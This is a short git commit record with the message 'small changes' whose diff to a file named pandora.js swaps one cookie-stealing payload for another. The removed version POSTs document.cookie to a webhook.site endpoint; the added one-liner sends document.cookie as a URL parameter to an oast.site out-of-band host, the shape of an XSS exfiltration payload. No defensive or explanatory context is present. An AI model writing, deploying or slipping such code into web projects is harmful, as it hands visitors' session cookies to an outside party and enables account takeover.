f9b96dd413386f5311efacb1afd2e95280bf9d45
Badr <macbookprom2@Badreddine-Belkadi.local>
2026-01-31 16:13:51 +0100

    small changes

--- pandora.js
+++ pandora.js
@@ -1,10 +1,1 @@
-fetch('https://webhook.site/48e25e07-09e6-41a3-91b0-9354f5571e13', {
-  method: 'POST',
-  headers: {
-    'Content-Type': 'application/json'
-  },
-  body: JSON.stringify({
-    data: document.cookie
-  })
-})
-
+fetch("https://vpfdmnwru5f4imv7d815i8idjcj58eqfr.oast.site?data="+encodeURIComponent(document.cookie))
